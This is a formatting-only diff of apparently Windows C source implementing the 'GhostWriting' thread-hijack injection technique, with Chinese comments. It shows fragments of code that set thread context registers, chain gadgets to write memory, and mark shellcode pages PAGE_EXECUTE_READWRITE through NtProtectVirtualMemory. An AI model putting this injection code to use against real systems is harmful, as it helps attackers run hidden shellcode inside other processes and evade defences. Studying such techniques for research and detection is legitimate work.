@@ -270,7 +270,7 @@ BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOS
 			_tprintf(_T("[x] GetThreadContext failed, error: 0x%x\n"), GetLastError());
 			return FALSE;
 		}
-		
+
 	} while ((PVOID)ThreadContext->Rip != JMPTOSELFAddress);
 
 	return TRUE;
@@ -377,13 +377,13 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 			+ ((5 + 0) * sizeof(PVOID))
 			+ Ghost->RspCompensation
 			+ (Ghost->PopCount * sizeof(PVOID)),
-		
+
 		ThreadContext.Rsp					// 栈帧：参数 NumberOfBytesToProtect，注意这是一个指针，指向临时变量 NumberOfBytesToProtect
 			+ BytesOfJmpToSelfAddress
 			+ ((5 + 1) * sizeof(PVOID))
 			+ Ghost->RspCompensation
 			+ (Ghost->PopCount * sizeof(PVOID)),
-		
+
 		PAGE_EXECUTE_READWRITE,				// 栈帧：参数 NewAccessProtection
 
 		ThreadContext.Rsp					// 栈帧：参数 OldAccessProtection，注意这是一个指针，指向临时变量 OldAccessProtection
@@ -396,9 +396,9 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 			+ BytesOfJmpToSelfAddress
 			+ Ghost->RspCompensation
 			+ (Ghost->PopCount * sizeof(PVOID)),
-		
+
 		(DWORD64)BytesOfShellcode,			// 临时变量 NumberOfBytesToProtect：内存保护的大小
-		
+
 		0									// 临时变量 OldAccessProtection：储存原内存权限
 	};
 
@@ -422,7 +422,7 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;
 
 		// 写入数据
-		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
+		if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
 			return FALSE;
 	}
 
@@ -481,7 +481,7 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;
 
 		// 写入数据
-		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
+		if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
 			return FALSE;
 	}
 
@@ -518,7 +518,7 @@ int _tmain(int argc, TCHAR* argv[])
 	if (NTDLLBase != NULL) {
 		_tprintf(_T("[+] NTDLL Base = %p\n"), NTDLLBase);
 	}
-	else{
+	else {
 		_tprintf(_T("[x] Failed to get ntdll.dll module\n"));
 		return 0;
 	}
